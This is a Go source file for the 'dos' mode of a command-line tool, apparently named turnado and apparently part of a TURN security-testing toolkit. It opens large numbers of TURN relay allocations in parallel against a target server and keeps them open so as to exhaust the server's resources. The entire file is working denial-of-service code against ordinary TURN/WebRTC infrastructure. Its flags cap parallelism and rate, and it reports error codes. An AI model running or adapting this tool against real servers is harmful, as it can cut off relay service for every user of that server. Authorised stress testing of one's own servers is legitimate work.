package app

import (
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"regexp"
	"sort"
	"sync"
	"sync/atomic"
	"time"

	"github.com/pion/turn/v4"
	"github.com/spf13/pflag"
)

type dosCfg struct {
	Common    commonConfig
	Sessions  int
	Peer      string
	Parallel  int
	Rate      float64
	StopFirst bool
}

type turnSession struct {
	Client    *turn.Client
	RelayConn net.PacketConn
	Cleanup   func()
}

func RunDOS(argv []string) error {
	fs := pflag.NewFlagSet("dos", pflag.ContinueOnError)

	origOut := io.Discard
	fs.SetOutput(origOut)

	var cfg dosCfg
	cfg.Common.Software = "turnado/dos"
	addCommonFlags(fs, &cfg.Common)

	fs.IntVarP(&cfg.Sessions, "sessions", "s", 1, "Number of TURN allocations to create")
	fs.StringVarP(&cfg.Peer, "peer", "P", "", "Optional peer ip:port for CreatePermission")
	fs.IntVar(&cfg.Parallel, "parallel", 16, "Maximum concurrent allocation attempts")
	fs.Float64Var(&cfg.Rate, "rate", 0, "Maximum allocation attempts per second (0 = unlimited)")
	fs.BoolVar(&cfg.StopFirst, "stop-first", false, "Stop creating allocations on the first error and exit after reporting")

	help := fs.BoolP("help", "h", false, "Show help message")

	fs.Usage = func() {
		fmt.Fprintln(os.Stdout, "Usage: turnado dos [options]")
		fs.SetOutput(os.Stdout)
		fs.PrintDefaults()
		printModeExamples(os.Stdout, "dos")
		fs.SetOutput(origOut)
	}

	if err := fs.Parse(argv); err != nil {
		return err
	}
	if *help {
		fs.Usage()
		return nil
	}
	if err := resolveCommonFlags(fs, &cfg.Common); err != nil {
		return err
	}
	if err := requireTurn(fs, cfg.Common.Turn); err != nil {
		return err
	}
	if err := validateCommon(cfg.Common); err != nil {
		return err
	}

	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	if cfg.Sessions <= 0 {
		return fmt.Errorf("invalid --sessions %d (must be >= 1)", cfg.Sessions)
	}
	if cfg.Parallel <= 0 || cfg.Parallel > 1000 {
		return fmt.Errorf("invalid --parallel %d (must be 1..1000)", cfg.Parallel)
	}
	if cfg.Rate < 0 || cfg.Rate > 10000 {
		return fmt.Errorf("invalid --rate %g (must be 0..10000)", cfg.Rate)
	}

	var peerAddr *net.UDPAddr
	if cfg.Peer != "" {
		pa, err := net.ResolveUDPAddr("udp", cfg.Peer)
		if err != nil {
			return fmt.Errorf("ResolveUDPAddr(peer=%q) failed: %w", cfg.Peer, err)
		}
		peerAddr = pa
	}

	log.Printf("Creating %d allocations against %s via %s", cfg.Sessions, cfg.Common.Turn, cfg.Common.Transport)

	var (
		wg           sync.WaitGroup
		mu           sync.Mutex
		sessions     []*turnSession
		errorsByCode = make(map[string]int)
		failed       atomic.Bool
		attempted    atomic.Int64
	)
	jobs := make(chan int)
	for worker := 0; worker < cfg.Parallel; worker++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := range jobs {
				if cfg.StopFirst && failed.Load() {
					continue
				}
				attempt := func() error {
					attempted.Add(1)
					client, _, cleanup, err := newTurnClient(cfg.Common)
					if err != nil {
						return err
					}

					relayConn, err := client.Allocate()
					if err != nil {
						cleanup()
						return err
					}

					if peerAddr != nil {
						if err := client.CreatePermission(peerAddr); err != nil && cfg.Common.Verbose > 0 {
							log.Printf("[session %d] CreatePermission(%s) failed: %v", i, peerAddr, err)
						}
					}

					mu.Lock()
					sessions = append(sessions, &turnSession{
						Client:    client,
						RelayConn: relayConn,
						Cleanup:   cleanup,
					})
					mu.Unlock()

					if cfg.Common.Verbose > 0 {
						log.Printf("[session %d] relay=%s", i, relayConn.LocalAddr().String())
					}
					return nil
				}
				if err := attempt(); err != nil {
					mu.Lock()
					errorsByCode[allocationErrorCode(err)]++
					mu.Unlock()
					failed.Store(true)
					log.Printf("[session %d] allocation failed: %v", i, err)
				}
			}
		}()
	}
	var ticker *time.Ticker
	if cfg.Rate > 0 {
		ticker = time.NewTicker(time.Duration(float64(time.Second) / cfg.Rate))
		defer ticker.Stop()
	}
	for i := 0; i < cfg.Sessions; i++ {
		if cfg.StopFirst && failed.Load() {
			break
		}
		if ticker != nil {
			<-ticker.C
		}
		if cfg.StopFirst && failed.Load() {
			break
		}
		jobs <- i
	}
	close(jobs)
	wg.Wait()
	log.Printf("Allocation results: %d succeeded, %d failed", len(sessions), int(attempted.Load())-len(sessions))
	codes := make([]string, 0, len(errorsByCode))
	for code := range errorsByCode {
		codes = append(codes, code)
	}
	sort.Strings(codes)
	for _, code := range codes {
		count := errorsByCode[code]
		log.Printf("  %s: %d", code, count)
	}

	if len(sessions) == 0 && !cfg.StopFirst {
		return errors.New("no successful sessions created")
	}

	if !cfg.StopFirst || !failed.Load() {
		log.Printf("Active allocations: %d/%d. Press Ctrl+C to close.", len(sessions), cfg.Sessions)
		waitForSignal()
	}

	for _, s := range sessions {
		if s == nil {
			continue
		}
		if s.RelayConn != nil {
			_ = s.RelayConn.Close()
		}
		if s.Cleanup != nil {
			s.Cleanup()
		}
	}
	if cfg.StopFirst && failed.Load() {
		return errors.New("stopped after first allocation error")
	}
	return nil
}

var turnErrorCodeRE = regexp.MustCompile(`error ([0-9]{3})`)

func allocationErrorCode(err error) string {
	if match := turnErrorCodeRE.FindStringSubmatch(err.Error()); match != nil {
		return match[1]
	}
	return "transport/other"
}
